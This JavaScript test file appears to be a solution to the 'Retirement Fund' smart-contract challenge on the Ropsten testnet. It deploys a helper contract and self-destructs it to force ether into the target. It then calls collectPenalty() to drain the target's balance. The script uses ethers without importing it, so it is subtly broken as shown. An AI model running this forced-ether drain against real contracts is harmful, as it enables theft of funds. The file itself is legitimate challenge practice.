const Web3 = require("web3");
const truffleContract = require('@truffle/contract');
// const ethers = require("ethers")
const { BigNumber, utils } = require("ethers")

const BN = require('bn.js');
const CONFIG = require("../../credentials.js");

const provider = new ethers.providers.WebSocketProvider(`wss://ropsten.infura.io/ws/v3/${CONFIG.infura.mainEndpoint}`)

const signer = new ethers.Wallet(CONFIG.wallet.PKEY);
const account = signer.connect(provider);

function isString(s) {
    return (typeof s === 'string' || s instanceof String)
}

const parseBaseUnit = (value, decimals) => {
    let orig = value;
    if (BN.isBN(value)) {
        value = value.toString()
    }
    if (!isString(value)) {
        throw new Error(`Not a String: ${value} ${decimals} ${orig}`)
    }
    value = BigNumber.from(value)
    return utils.formatUnits(value, decimals)
}

const toBaseUnit = (value, decimals) => {
    if (!isString(value)) {
        throw new Error('Pass strings to prevent floating point precision issues.')
    }
    const ten = new BN(10);
    const base = ten.pow(new BN(decimals));

    // Is it negative?
    let negative = (value.substring(0, 1) === '-');
    if (negative) {
        value = value.substring(1);
    }

    if (value === '.') {
        throw new Error(
            `Invalid value ${value} cannot be converted to`
            + ` base unit with ${decimals} decimals.`
        );
    }

    // Split it into a whole and fractional part
    let comps = value.split('.');
    if (comps.length > 2) { throw new Error('Too many decimal points'); }

    let whole = comps[0]; let
        fraction = comps[1];

    if (!whole) { whole = '0'; }
    if (!fraction) { fraction = '0'; }
    if (fraction.length > decimals) {
        throw new Error('Too many decimal places');
    }

    while (fraction.length < decimals) {
        fraction += '0';
    }

    whole = new BN(whole);
    fraction = new BN(fraction);
    let wei = (whole.mul(base)).add(fraction);

    if (negative) {
        wei = wei.neg();
    }

    return new BN(wei.toString(10), 10);
}

const contractAddress = "0xb01e2dd9A16Ed02A1f27B73BE6484a2a888d21Cd"

const contractInst = new ethers.Contract(
    contractAddress,
    [
        "function collectPenalty() external"
    ],
    account
);

contract ("Retirement Fund", async () =>{
    let accounts;
    before(async () => {
        // accounts = await web3.eth.getAccounts()
    })
    it("should print contract", async () => {
        // console.log(contractInst)
    })
    it("should make transaction", async () => {
        const temp = await ethers.getContractFactory("RetirementFund");
        const test = await temp.deploy();
        
        // const temp = "0x030f21c9eF650ca62105E70bE818865F2993E80a"

        // const test = new ethers.Contract(
        //     temp,
        //     [
        //         "function destroy() external",
        //         "function setTargetContract(address _target) external",
        //     ],
        //     account
        // );
        console.log(test.address)

        let tx = await test.setTargetContract(contractAddress);
        await tx.wait()

        tx = await web3.eth.sendTransaction({from: account.address, to:test.address, value:1e18.toString() })
        
        let befBal = await web3.eth.getBalance(contractAddress)
        tx = await test.destroy()
        await tx.wait()
        let aftBal = await web3.eth.getBalance(contractAddress)
        console.log({
            befBal: parseBaseUnit(befBal.toString(), 18),
            aftBal: parseBaseUnit(aftBal.toString(), 18),
        })

        tx = await contractInst.collectPenalty();
        await tx.wait()

        aftBal = await web3.eth.getBalance(contractAddress)
        console.log({
            aftBal: parseBaseUnit(aftBal.toString(), 18),
        })
    })
})